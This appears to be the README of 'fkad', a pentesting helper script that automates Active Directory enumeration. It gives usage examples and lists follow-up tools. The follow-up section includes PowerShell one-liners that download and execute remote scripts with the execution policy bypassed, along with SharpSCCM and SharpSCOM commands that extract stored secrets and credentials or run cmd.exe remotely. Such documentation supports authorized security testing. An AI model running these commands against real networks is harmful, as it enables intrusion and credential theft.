# fkad

![fkad](https://github.com/user-attachments/assets/b1e3375e-75f1-46e2-9616-4c469f9fe5b1)


`fkad` is a small offensive helper script designed for exegol docker containers and pentesting instances. It automates common and mundane enumeration tasks, executes sanity checks and prepares artifacts for follow-up toolkits. 

## Quick install & run

```bash
wget https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.sh
chmod +x fkad.sh
./fkad.sh -u <user> -p '<password>' -d <dc-ip/domain.com>
```

> [!NOTE]
> The -fast flag limits extensive checks in AD environments with a lot of dead objects.

<img width="2208" height="1166" alt="screen" src="https://github.com/user-attachments/assets/c5742863-ab7e-400a-a386-f3556759f57c" />

Example:

```bash
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d 10.10.2.13
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com -fast
```

## Follow-Up Enumeration

For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:

- [ ] Pingcastle
- [ ] fkad.ps1
```ps
powershell -ep bypass -c "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
```
- [ ] MSSQL
```powershell
IEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$env:USERPROFILE\Downloads\fkad\mssql_priv.txt"
```
- [ ] Seatbelt
- [ ] WinPEAS
```powershell
IEX (iwr 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
```
- [ ] msicrab
- [ ] Snaffler
- [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
```powershell
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe get collections
SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
```
- [ ] [SharpSCOM](https://github.com/breakfix/SharpSCOM) - SCOM Enumeration
```powershell
SharpSCOM.exe get-server
SharpSCOM.exe get-creds
```

## Other Tools

Most likely these should be run across the network as well.

- [ ] Nessus
- [ ] Responder
- [ ] GoWitness
```sh
nmap -p80,443 -oX nmap.xml 10.192.14.0/24
gowitness scan nmap -f nmap.xml --open-only --service-contains http
```

## Security / Legal

This tool is for authorized security testing, research, and defensive validation only. Do not use it against systems you do not own or do not have explicit permission to test. The author is not responsible for misuse.
